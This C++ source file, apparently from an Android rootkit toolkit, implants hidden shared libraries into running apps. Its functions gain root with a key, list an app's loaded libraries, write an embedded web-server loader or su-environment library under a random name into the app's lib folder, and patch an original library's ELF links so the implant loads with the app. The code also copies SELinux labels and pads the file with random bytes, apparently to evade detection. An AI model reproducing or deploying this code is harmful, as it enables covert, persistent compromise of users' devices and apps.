#include "rootkit_parasite_app.h"

#include <string.h>
#include <iostream>
#include <fstream>
#include <memory>
#include <set>
#include <vector>
#include <map>
#include <filesystem>
#include <random>
#include <dirent.h>
#include <sys/stat.h> 
#include <sys/types.h>
#include <sys/xattr.h>


#include "rootkit_umbrella.h"
#include "rootkit_parasite_patch_elf.h"
#include "rootkit_maps_helper.h"
#include "rootkit_fork_helper.h"
#include "rootkit_random.h"
#include "common/file_replace_string.h"
#include "common/file_utils.h"
#include "lib_web_server_loader/lib_web_server_loader_inline.h"
#include "lib_su_env/lib_su_env_inline.h"
#include "lib_su_env/lib_su_env_data.generated.h"

namespace kernel_root {
	
#ifndef XATTR_NAME_SELINUX
#define XATTR_NAME_SELINUX "security.selinux"
#endif

namespace {
	constexpr const char * arm64_key_folder = "/arm64";
	constexpr const char * arm32_key_folder = "/arm";
	constexpr const char * lib_key_folder = "/lib";

	static std::string get_name_from_path(const char* path) {
		std::filesystem::path p(path);
		return p.filename();
	}

	static bool random_expand_file(const char* file_path) {
  		std::ofstream file(file_path, std::ios::binary | std::ios::app);
		if (!file.is_open()) {
			return false;
		}

		std::random_device rd;
		std::mt19937 gen(rd());
		// 随机大小：1MB–5MB
		std::uniform_int_distribution<size_t> size_dis(1 * 1024 * 1024, 5 * 1024 * 1024);
		size_t random_size = size_dis(gen);
		std::uniform_int_distribution<unsigned> byte_dis(0, 255);
		std::vector<char> buffer(random_size);
		for (size_t i = 0; i < random_size; ++i) {
			buffer[i] = static_cast<char>(byte_dis(gen));
		}
		file.write(buffer.data(), buffer.size());
		if (!file) {
			return false;
		}
		file.close();
		return true;
	}
	
	static bool copy_selinux_context(const char* source_file_path, const char* target_file_path) {
		char selinux_context[512] = { 0 }; // adjust the size as per your requirement
		
		// Retrieve the SELinux context from the source file
		ssize_t length = getxattr(source_file_path, XATTR_NAME_SELINUX, selinux_context, sizeof(selinux_context));
		if (length == -1) {
			return false;
		}
		selinux_context[length] = '\0'; // ensure null termination

		// Set the SELinux context to the target file
		if (setxattr(target_file_path, XATTR_NAME_SELINUX, selinux_context, strlen(selinux_context) + 1, 0)) {
			return false;
		}

		return true;
	}

	static KRootErr _internal_parasite_implant_app(const char* str_root_key, const char* target_pid_cmdline,
		const char* original_so_full_path, const char* implant_so_full_path) {
		RETURN_ON_ERROR(get_root(str_root_key));
		if(!file_utils::file_exists(original_so_full_path)) {
			return KRootErr::ERR_NOT_EXIST_ORIGINAL_FILE;
		}
		if(!file_utils::file_exists(implant_so_full_path)) {
			return KRootErr::ERR_NOT_EXIST_IMPLANT_FILE;
		}
		if (!copy_selinux_context(original_so_full_path, implant_so_full_path)) {
			return KRootErr::ERR_COPY_SELINUX;
		}
		// Because it is in the same directory as the parasitized so, all you need to do here is fill in the file name of so
		std::string implant_so_name = get_name_from_path(implant_so_full_path);
		if (!parasite_check_so_link(original_so_full_path, implant_so_name.c_str())) {
			return KRootErr::OK; //have already been linked
		}
		if (parasite_start_link_so(original_so_full_path, implant_so_name.c_str())) {
			return KRootErr::ERR_LINK_SO;
		}
		if (parasite_check_so_link(original_so_full_path, implant_so_name.c_str())) {
			return KRootErr::ERR_CHECK_LINK_SO;
		}
		return KRootErr::OK;
	}


}

static KRootErr unsafe_parasite_precheck_app(const char* str_root_key, const char* target_pid_cmdline, std::map<std::string, AppDynlibStatus> &output_dynlib_full_path) {
	RETURN_ON_ERROR(get_root(str_root_key));
	std::string app_path = get_app_directory(target_pid_cmdline);
	if(app_path.empty()) {
		return KRootErr::ERR_APP_DIR;
	}
	std::set<pid_t> pout;
	RETURN_ON_ERROR(find_all_cmdline_process(str_root_key, target_pid_cmdline, pout));
	if(pout.size() == 0) {
		return KRootErr::ERR_FIND_CMDLINE_PROC;
	}
	output_dynlib_full_path.clear();
	bool exist_32bit = false;
	for(pid_t pid : pout) {
		std::set<std::string> current_so_paths = get_all_so_paths(pid);
		for (const std::string& path : current_so_paths) {
			std::string filename = get_name_from_path(path.c_str());

			if(path.find(arm64_key_folder) != std::string::npos) {
				if(path.find(app_path) != std::string::npos) {
					output_dynlib_full_path[path] = AppDynlibStatus::Running;
				}
			} else if(!exist_32bit) {
				// check if it is a 32-bit application
				if (path.find(arm32_key_folder) != std::string::npos) {
					exist_32bit = true;
				}
			}
		}
	}
	std::string lib_path = app_path;
	lib_path += lib_key_folder;
	lib_path += arm64_key_folder;
	DIR* dir = opendir(lib_path.c_str());
	if (dir) {
		struct dirent * entry;
		while ((entry = readdir(dir)) != NULL) {
			std::string all_cmdline;
			if ((strcmp(entry->d_name, ".") == 0) || (strcmp(entry->d_name, "..") == 0)) {
				continue;
			} else if (entry->d_type == DT_DIR) {
				continue;
			} else if (!strstr(entry->d_name, ".so")) {
				continue;
			}
			std::string str_d_name = entry->d_name;
			std::string full_path = lib_path + "/" + str_d_name;
			if(output_dynlib_full_path.find(full_path) != output_dynlib_full_path.end()) {
				continue;
			}
			output_dynlib_full_path[full_path] = AppDynlibStatus::NotRunning;
		}
		closedir(dir);
	}
	if(output_dynlib_full_path.size() == 0 && exist_32bit) {
	    return KRootErr::ERR_EXIST_32BIT;
	}
	return KRootErr::OK;
}

static KRootErr safe_parasite_precheck_app(const char* str_root_key, const char* target_pid_cmdline, std::map<std::string, AppDynlibStatus> &output_dynlib_full_path) {
	fork_pipe_info finfo;
	std::map<std::string, int> data;
	if(fork_pipe_child_process(finfo)) {
		KRootErr ret = unsafe_parasite_precheck_app(str_root_key, target_pid_cmdline, output_dynlib_full_path);
		for(auto & item : output_dynlib_full_path) {
			data[item.first] = item.second;
		}
		write_errcode_from_child(finfo, ret);
		write_map_s_i_from_child(finfo, data);
		finfo.close_all();
		_exit(0);
		return KRootErr::OK;
	}
	KRootErr err = KRootErr::OK;
	if(!read_errcode_from_child(finfo, err)) err = KRootErr::ERR_READ_CHILD_ERRCODE;
	else if(!read_map_s_i_from_child(finfo, data)) err = KRootErr::ERR_READ_CHILD_MAP_S_I;
	for(auto & item : data) {
		output_dynlib_full_path[item.first] = static_cast<AppDynlibStatus>(item.second);
	}
	int status = 0; waitpid(finfo.child_pid, &status, 0);
	return err;
}

KRootErr parasite_precheck_app_with_cb(const char* str_root_key, const char* target_pid_cmdline, void (*cb)(const char* dynlib_full_path, AppDynlibStatus status)) {
	std::map<std::string, AppDynlibStatus> output;
	RETURN_ON_ERROR(safe_parasite_precheck_app(str_root_key, target_pid_cmdline, output));
	for(auto& item : output) {
		cb(item.first.c_str(), item.second);
	}
	return KRootErr::OK;
}

#ifdef LIBWEB_SERVER_LOADER_DATA
static KRootErr write_web_server_so_file(const char* str_root_key, const char* implant_so_full_path) {
	std::shared_ptr<char> sp_lib_web_server_loader_file_data(new (std::nothrow) char[lib_web_server_loader_file_size], std::default_delete<char[]>());
	if(!sp_lib_web_server_loader_file_data) {
		return KRootErr::ERR_NO_MEM;
	}
	memcpy(sp_lib_web_server_loader_file_data.get(), reinterpret_cast<char*>(lib_web_server_loader_file_data), 
	lib_web_server_loader_file_size);

	// write root key
	if(!replace_feature_string_in_buf(const_cast<char*>(static_inline_lib_web_server_loader_root_key), sizeof(static_inline_lib_web_server_loader_root_key),
		str_root_key, sp_lib_web_server_loader_file_data.get(), lib_web_server_loader_file_size)) {
		return KRootErr::ERR_WRITE_ROOT_SERVER;
	}

	// write out disk
	remove(implant_so_full_path);
    std::ofstream file(std::string(implant_so_full_path), std::ios::binary | std::ios::out);
    if (!file.is_open()) {
        return KRootErr::ERR_OPEN_FILE;
    }
    file.write(sp_lib_web_server_loader_file_data.get(), lib_web_server_loader_file_size);
    file.close();
	if (chmod(implant_so_full_path, 0777)) {
		return KRootErr::ERR_CHMOD;
	}
	random_expand_file(implant_so_full_path);
    return KRootErr::OK;
}

static KRootErr unsafe_parasite_implant_app(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path) {
	std::filesystem::path path(original_so_full_path);
	std::string dir_path = path.parent_path().string();
	std::string implant_so_full_path = dir_path  + "/" + generate_lib_name();
	RETURN_ON_ERROR(get_root(str_root_key));
	remove(implant_so_full_path.c_str());
	RETURN_ON_ERROR(write_web_server_so_file(str_root_key, implant_so_full_path.c_str()));
	return _internal_parasite_implant_app(str_root_key, target_pid_cmdline, original_so_full_path, implant_so_full_path.c_str());
}

static KRootErr safe_parasite_implant_app(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path) {
	fork_pipe_info finfo;
	if(fork_pipe_child_process(finfo)) {
		KRootErr ret = unsafe_parasite_implant_app(str_root_key, target_pid_cmdline, original_so_full_path);
		write_errcode_from_child(finfo, ret);
		finfo.close_all();
		_exit(0);
		return KRootErr::OK;
	}
	KRootErr err = KRootErr::OK;
	if(!read_errcode_from_child(finfo, err)) err = KRootErr::ERR_READ_CHILD_ERRCODE;
	int status = 0; waitpid(finfo.child_pid, &status, 0);
	return err;
}

KRootErr parasite_implant_app(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path) {
	return safe_parasite_implant_app(str_root_key, target_pid_cmdline, original_so_full_path);
}
#endif

static KRootErr write_su_env_so_file(const char* str_root_key, const char* implant_so_full_path, const char* su_dir_path) {
	std::shared_ptr<char> sp_lib_su_env_file_data(new (std::nothrow) char[lib_su_env_file_size], std::default_delete<char[]>());
	if(!sp_lib_su_env_file_data) {
		return KRootErr::ERR_NO_MEM;
	}
	memcpy(sp_lib_su_env_file_data.get(), reinterpret_cast<char*>(lib_su_env_file_data), 
	lib_su_env_file_size);

	// write su folder
	if(!replace_feature_string_in_buf(const_cast<char*>(static_inline_su_dir_path), sizeof(static_inline_su_dir_path), su_dir_path, sp_lib_su_env_file_data.get(), lib_su_env_file_size)) {
		return KRootErr::ERR_WRITE_SU_ENV_SO_FILE;
	}

	// write out disk
	remove(implant_so_full_path);
    std::ofstream file(std::string(implant_so_full_path), std::ios::binary | std::ios::out);
    if (!file.is_open()) {
        return KRootErr::ERR_OPEN_FILE;
    }
    file.write(sp_lib_su_env_file_data.get(), lib_su_env_file_size);
    file.close();
	if (chmod(implant_so_full_path, 0777)) {
		return KRootErr::ERR_CHMOD;
	}
	random_expand_file(implant_so_full_path);
    return KRootErr::OK;
}

static KRootErr unsafe_parasite_implant_su_env(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path, const char* su_dir_path) {
	std::filesystem::path path(original_so_full_path);
	std::string dir_path = path.parent_path().string();
	std::string implant_so_full_path = dir_path  + "/" + generate_lib_name();
	RETURN_ON_ERROR(get_root(str_root_key));
	remove(implant_so_full_path.c_str());
	RETURN_ON_ERROR(write_su_env_so_file(str_root_key, implant_so_full_path.c_str(), su_dir_path));
	return _internal_parasite_implant_app(str_root_key, target_pid_cmdline, original_so_full_path, implant_so_full_path.c_str());
}

static KRootErr safe_parasite_implant_su_env(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path, const char* su_dir_path) {
	fork_pipe_info finfo;
	if(fork_pipe_child_process(finfo)) {
		KRootErr ret = unsafe_parasite_implant_su_env(str_root_key, target_pid_cmdline, original_so_full_path, su_dir_path);
		write_errcode_from_child(finfo, ret);
		finfo.close_all();
		_exit(0);
		return KRootErr::OK;
	}
	KRootErr err = KRootErr::OK;
	if(!read_errcode_from_child(finfo, err)) err = KRootErr::ERR_READ_CHILD_ERRCODE;
	int status = 0; waitpid(finfo.child_pid, &status, 0);
	return err;
}

KRootErr parasite_implant_su_env(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path, const char* su_dir_path) {
	return safe_parasite_implant_su_env(str_root_key, target_pid_cmdline, original_so_full_path, su_dir_path);
}

}